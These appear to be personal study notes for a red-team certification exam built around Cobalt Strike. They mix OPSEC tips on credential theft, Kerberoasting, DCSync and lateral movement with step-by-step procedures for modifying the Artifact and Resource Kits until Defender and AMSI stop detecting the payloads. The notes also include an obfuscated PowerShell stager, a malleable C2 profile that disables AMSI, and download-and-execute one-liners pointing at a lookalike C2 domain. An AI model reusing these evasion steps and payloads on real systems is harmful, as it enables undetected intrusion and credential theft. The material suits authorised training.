## OPSEC Notes
```powershell
beacon> timestomp [payload] [other thing] # helps blend payloads in 


## Post-exploitation
# screenshots # Avoid printscreen
beacon> screenshot [pid] [x86|x64]   # inject into specified process
	# View > Screenshots to view

# Execution Commands 
dont... shell and run are BAD OPSEC

# Executing Custom Tools
powershell # avoid
powerpick # avoid
psinject # okay... careful
execute-assembly # ok
inline-execute # BOFs... ok

## Credential Access
Dont LSASS dump... simple
RC4 is no bueno... use AES256
AS-REP Roasting... go slow, not multiple AS-REQs at a time
Kerberoasting... Triage first, identify targets, and roast selectively
Extracting tickets... bueno, but probably dump selectively.

## Discovery
LDAP - a few things to keep in mind
	huge queries (expensive) are BAD - # (objectClass=*)
	queries that take a long time. filter for specific properties instead - # *,ntsecuritydescriptor
	inefficient queries - weird one, check out the lesson


## Lateral Movement
WinRM is good
PSExec sucks - its really LOUD
	SCShell is better
LOLBAS overrated, usually blocked

## Kerberos
lost of cool stuff
run klist is BAD OPSEC 
dont kerberoast stuff for no reason...

## Domain dominance
DCSync  - do it ON the DC. also dont sync everything, target things like DC computer account and domain krbtgt
Ticket forgery - use diamond tickets where possible, otherwise try and make ticket data non-anomalous
diamond tickets are the best opsec...



CreateRemoteThread is removed via out malleable C2 edit...
```

Thing we want to avoid during Exam
	![[Pasted image 20260108200319.png]]

One Liners
```powershell
# Check Defender
Get-MPPreference

# Enable defender -- See Enabling Defender, we need to enable via GPO
Set-MPPreference -DisableRealtimeMonitoring $false

# Check if Constrained Language Mode is present
beacon> powershell $ExecutionContext.SessionState.LanguageMode
```

## Initial Setup for CRTO Exam

1.- Modify Artifact Kit
```c
/* Open C:\Tools\cobaltstrike\arsenal-kit\kits\artifact in VSCode */
/* Navigate to src-common and open patch.c. */

/* Line 45, replace for loop with while loop */
x = length;
while(x--) {
  *((char *)buffer + x) = *((char *)buffer + x) ^ key[x % 8];
}

/* Line ~116, replace for loop with while loop */
int x = length;
while(x--) {
  *((char *)ptr + x) = *((char *)buffer + x) ^ key[x % 8];
}
```

```powershell
# Modify script_template.cna and replace all instances of rundll32.exe with msedge.exe
$template_path="C:\Tools\cobaltstrike\arsenal-kit\kits\artifact\script_template.cna" ; (Get-Content -Path $template_path) -replace 'rundll32.exe' , 'msedge.exe' | Set-Content -Path $template_path

# Compile the Artifact kit (From WSL in Attacker windows Machine)
$ cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
$ ./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts 

# Check Artifact kit payload against ThreatCheck
PS > C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe
	# Make note of hexcode identified, reverse via Ghidra, modify, save.

# Recompile
# Retest
# Repeat until...
[+] No threat found!

# Load into Cobalt Strike
C:\Tools\cobaltstrike\custom-artifacts\mailslot\artifact.cna
```

2.- Compile Resource Kit
```powershell
# Build (WSL)
$ cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource && ./build.sh /mnt/c/Tools/cobaltstrike/custom-resources

# Open C:\Tools\cobaltstrike\custom-resources in VSCode
# Select template.x64.ps1

# Line 5, replace 
.Equals('System.dll') -> .Equals('Sys'+'tem.dll')

# Line 32, replace entire line
$var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll WriteProcessMemory), (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool])))
$ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)

# Save
# Test
PS > C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\cobaltstrike\custom-resources\template.x64.ps1 -e amsi
	# Make note of code identified, open with VSCode

# Remodify
# Retest
# Repeat until...
[+] No threat found!

# Select compress.ps1
# Use Invoke-Obfuscation to create unique obfuscation, or...
SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();

# Save

# Testing (ThreatCheck no worky on this one...)
Host on Cobalt Strike a new PAYLOAD (not compress.ps1) # Do after payload creation
IEX ((new-object net.webclient).downloadstring('http://10.0.0.5/test'))
	# See if PS errors out or not...

# Remodify
# Retest
# Repeat until no error.

# Load into Cobalt Strike
C:\Tools\cobaltstrike\resources\resources.cna
```

3.- Malleable C2 Setup
```powershell
# SSH into team server
ssh attacker@10.0.0.5

# Move to profiles directory
cd /opt/cobaltstrike/profiles

# Modify C2 profile
vim default.profile

# Modify the file (APPEND, not replace dingo)

stage {
   set userwx "false";
   set module_x64 "Hydrogen.dll";  # use a different module if you like
   set copy_pe_header "false";
}

post-ex {
  set amsi_disable "true";
  set spawnto_x64 "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
  set obfuscate "true";
  set cleanup "true";

  transform-x64 {
      strrep "ReflectiveLoader" "NetlogonMain";
      strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Assembly threw an exception";
      strrepex "PowerPick" "PowerShellRunner" "PowerShellEngine";

      # add any other transforms that you want
  }
}

process-inject {
  execute {
      NtQueueApcThread-s;
      NtQueueApcThread;
      SetThreadContext;
      RtlCreateUserThread;
      CreateThread;
  }
}

# Save, then restart teamserver
sudo /usr/bin/docker restart cobaltstrike-cs-1
```

4.- Create Listeners
```powershell
Cobalt Strike > Listeners > Add

# HTTP
Name: http
Payload: Beacon HTTP
HTTP Hosts: www.bleepincomputer.com
HTTP Host (Stager) : www.bleepincomputer.com

# SMB
Name: smb
Payload: Beacon SMB
Pipename: TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337  # > ls \\.\pipe\
	# For realworld, consider msedge.pipe.7732 or something similar...

# TCP
Name: tcp
Payload: Beacon TCP
Port: 4444
Bind to localhost: False

# TCP (local)
Name: tcp-local
Payload: Beacon TCP
Port: 1337
Bind to localhost: True
```

5.- Testing
```powershell
# Generate Payloads
Payloads > Windows Stageless Generate All Payloads # Folder: C:\Payloads

# Host 64-bit powershell payload
C:\Payloads\http_x64.ps1
URI: /test
Host: www.bleepincomputer.com

# Enable Defender RTP (ON OUR BOX OR TEST BOX)
Set-MPPreference -DisableRealTimeMonitoring $false

# Invoke powershell payload
iex (new-object net.webclient).downloadstring("http://www.bleepincomputer.com/test")
	# did it work? if so, we are good

# Testing Lateral Movement (this was in lab but not sure how we can actually test this before doing it...)
beacon> make_token CONTOSO\rsteel Passw0rd! # Impersonate local admin
‌‌beacon> remote-exec winrm lon-ws-1 (Get-MpPreference).DisableRealtimeMonitoring # verify defender status
beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe # change spawn process
beacon> jump psexec64 lon-ws-1 smb # jump!
```

